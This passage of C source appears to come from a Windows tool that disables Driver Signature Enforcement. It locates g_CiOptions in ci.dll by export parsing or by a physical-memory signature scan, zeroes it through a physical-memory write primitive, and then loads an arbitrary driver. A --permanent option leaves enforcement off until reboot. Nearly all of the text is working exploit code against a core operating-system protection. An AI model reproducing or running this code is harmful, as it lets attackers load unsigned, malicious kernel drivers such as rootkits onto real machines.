    g_cr3 = find_kernel_cr3(ntos_va);
    if(!g_cr3){
        printf("[!] Kernel CR3 not found — VA→PA translation unavailable\n");
        printf("    Method A requires CR3. Falling back to Method B only.\n");
    } else {
        printf("[+] Kernel CR3 = 0x%016"PRIX64"\n\n", g_cr3);
    }

    /* ── 5. Find ci.dll ── */
    uint64_t ci_va=0; uint64_t ci_sz=0;
    char ci_path[300]={0};
    if(ml){
        for(ULONG i=0;i<ml->NumberOfModules;i++){
            const char *fn2=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
            if(_stricmp(fn2,"CI.dll")==0||_stricmp(fn2,"ci.dll")==0){
                ci_va=(uint64_t)ml->Modules[i].ImageBase;
                ci_sz=ml->Modules[i].ImageSize;
                const char *fp=ml->Modules[i].FullPathName;
                if(_strnicmp(fp,"\\SystemRoot\\",12)==0){
                    char windir[MAX_PATH]={0};
                    GetWindowsDirectoryA(windir,sizeof windir);
                    snprintf(ci_path,sizeof ci_path,"%s%s",windir,fp+11);
                } else {
                    strncpy(ci_path,fp,sizeof ci_path-1);
                }
                break;
            }
        }
        free(ml);
    }

    if(ci_va){
        printf("[+] ci.dll  VA=0x%016"PRIX64"  size=0x%"PRIX64"\n", ci_va, ci_sz);
        printf("[+] ci.dll  path=%s\n\n", ci_path);
    } else {
        /* Module not in NtQuerySystemInformation list (Win11 25H2+ or protected).
         * Method B (physical signature scan) does NOT need ci_va — only the disk
         * file. Fall back to the well-known system path. Method A is skipped. */
        printf("[!] ci.dll not in module list — using well-known path (Method A skipped)\n");
        char windir[MAX_PATH]={0};
        GetWindowsDirectoryA(windir,sizeof windir);
        snprintf(ci_path,sizeof ci_path,"%s\\system32\\CI.dll",windir);
        if(GetFileAttributesA(ci_path)==INVALID_FILE_ATTRIBUTES){
            printf("[!] CI.dll not found at %s — cannot proceed\n", ci_path);
            CloseHandle(g_dev); return 1;
        }
        printf("[+] ci.dll  path=%s  (VA unknown, Method B only)\n\n", ci_path);
    }

    /* ── 6. Find g_CiOptions PA ── */
    uint64_t cioptions_pa = 0;

    /* Read ci.dll from disk — needed by both Method A and Method B */
    DWORD disk_sz=0;
    uint8_t *ci_disk = ci_path[0] ? read_file(ci_path,&disk_sz) : NULL;
    if(!ci_disk)
        printf("[!] Cannot read ci.dll from disk — Method A unavailable\n");

    /* Method A: parse CipInitialize → follow RIP-relative refs to g_CiOptions.
     * Requires ci_va (load address) to compute correct target VAs. */
    if(ci_disk && g_cr3 && ci_va){
        printf("[*] Method A — parse CipInitialize export...\n");
        cioptions_pa = find_cioptions_via_export(ci_disk, disk_sz, ci_va);
    }

    /* Method B: physical signature scan (works on Hyper-V, no VA→PA needed)
     * Read .data section bytes from disk, build unique 32-byte signature,
     * scan all physical RAM. Data pages of ci.dll ARE readable even on Hyper-V. */
    if(!cioptions_pa && ci_disk){
        printf("[*] Method B — physical signature scan of ci.dll .data...\n");
        cioptions_pa = find_cioptions_via_phys_scan(ci_disk, disk_sz);
    }

    if(ci_disk) free(ci_disk);

    if(!cioptions_pa){
        printf("[!] Could not locate g_CiOptions. Aborting.\n");
        CloseHandle(g_dev); return 1;
    }

    /* ── 7. Read current value (use chunk read — page reads fail at high PA) ── */
    uint32_t original_val=0;
    if(!phys_read_chunk(cioptions_pa, &original_val, 4)){
        printf("[!] phys_read_chunk g_CiOptions failed\n");
        CloseHandle(g_dev); return 1;
    }
    printf("\n[+] g_CiOptions PA=0x%016"PRIX64"  current value=0x%X\n",
           cioptions_pa, original_val);

    if(original_val!=0x6 && original_val!=0x8 && original_val!=0x0){
        printf("[!] Unexpected value 0x%X — may have wrong address. Aborting.\n",
               original_val);
        CloseHandle(g_dev); return 1;
    }

    if(check_only){
        printf("[*] --check mode: not patching.\n");
        printf("    DSE is currently %s\n",
               original_val==0 ? "DISABLED" : "ENABLED (0x6)");
        CloseHandle(g_dev); return 0;
    }

    if(original_val==0){
        printf("[*] DSE is already disabled (value=0x0). Nothing to do.\n");
        CloseHandle(g_dev); return 0;
    }

    /* ── 8. Patch: write 0 ── */
    printf("[*] Patching g_CiOptions: 0x%X → 0x0 ...\n", original_val);
    uint32_t zero=0;
    if(!phys_write(cioptions_pa, &zero, 4)){
        printf("[!] phys_write failed\n");
        CloseHandle(g_dev); return 1;
    }

    /* Verify */
    uint32_t check_val=0x6;
    phys_read_chunk(cioptions_pa,&check_val,4);
    if(check_val!=0){
        printf("[!] Verify failed: value still 0x%X after write\n",check_val);
        printf("    This may indicate HVCI is active but not detected via registry.\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] DSE DISABLED — g_CiOptions=0x0\n\n");

    /* ── 9. Load the driver ── */
    printf("[*] Loading driver: %s\n", abs_drv_path);
    int load_ok = load_driver(abs_drv_path, svc_name);

    /* ── 10. Restore g_CiOptions (always, unless --permanent) ──
     * Restore happens REGARDLESS of load success/failure.
     * If load failed, we still want DSE re-enabled.
     * If load succeeded, driver is already in kernel — restore doesn't unload it. */
    if(!permanent){
        printf("\n[*] Restoring DSE: g_CiOptions → 0x%X ...\n", original_val);
        if(!phys_write(cioptions_pa, &original_val, 4)){
            printf("[!] Restore write failed! DSE may still be disabled.\n");
        } else {
            uint32_t v2=0; phys_read_chunk(cioptions_pa,&v2,4);
            if(v2==original_val)
                printf("[+] DSE restored — g_CiOptions=0x%X\n", v2);
            else
                printf("[!] Restore verify failed: got 0x%X (expected 0x%X)\n",
                       v2, original_val);
        }
    } else {
        printf("[!] --permanent: DSE stays disabled until reboot.\n");
    }

    CloseHandle(g_dev);

    if(load_ok==0){
        printf("\n[+] Done. Driver loaded successfully.\n");
        printf("    DSE restored. Driver remains active until unloaded or reboot.\n");
        return 0;
    } else {
        printf("\n[!] Driver load failed. See errors above.\n");
        return 1;
    }
}
